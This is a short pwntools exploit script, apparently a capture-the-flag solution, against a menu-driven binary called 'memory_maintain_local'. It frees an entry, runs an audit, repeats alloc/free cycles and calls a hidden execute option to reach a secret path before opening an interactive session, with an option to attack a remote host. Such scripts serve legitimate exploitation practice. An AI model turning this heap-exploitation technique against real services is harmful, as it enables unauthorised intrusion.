#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""


exe = "./memory_maintain_local"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

def alloc(idx):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'(0-14): ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'Choice: ', b'4')
    io.sendlineafter(b'(0-14): ', str(idx).encode())

def audit():
    io.sendlineafter(b'Choice: ', b'7')

def exec(idx):
    io.sendlineafter(b'Choice: ', b'5')
    io.sendlineafter(b'(0-14): ', str(idx).encode())
def secret():
    for i in range(7):
        exec(13)

free(0)
audit()

for i in range(25):
    alloc(0)
    free(0)

secret()

io.interactive()

